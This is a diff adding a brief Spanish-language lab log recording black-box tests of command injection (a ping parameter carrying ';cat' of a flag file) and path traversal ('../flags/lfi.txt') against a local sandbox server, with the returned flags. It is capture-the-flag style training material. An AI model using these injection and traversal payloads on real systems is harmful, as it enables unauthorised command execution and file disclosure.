@@ -1,0 +1,13 @@
+# Lab 07 — Parte B (Lautaro). R3 (command injection) y R4 (path traversal).
+# Entorno: sandbox Linux (target server.py del lab corrido en /app = WORKDIR del Dockerfile),
+# phantomcorp -> 127.0.0.1. Caja negra: no se leyo el codigo del target para obtener flags.
+# Fecha: 2026-11-20T03:12:11Z UTC == 2026-11-20 00:12 -03
+
+### R3 — GET /herramientas/ping?host=127.0.0.1;cat /app/flags/cmdi.txt
+$ ping -c1 127.0.0.1;cat /app/flags/cmdi.txt
+FLAG{command_injection_rce}
+
+### R4 — GET /descargar?archivo=../flags/lfi.txt  (probe de traversal)
+FLAG{path_traversal_lfi}
+### R4 — GET /descargar?archivo=../../flags/lfi.txt
+No se pudo abrir: [Errno 2] No such file or directory: '/app/public/../../flags/lfi.txt'
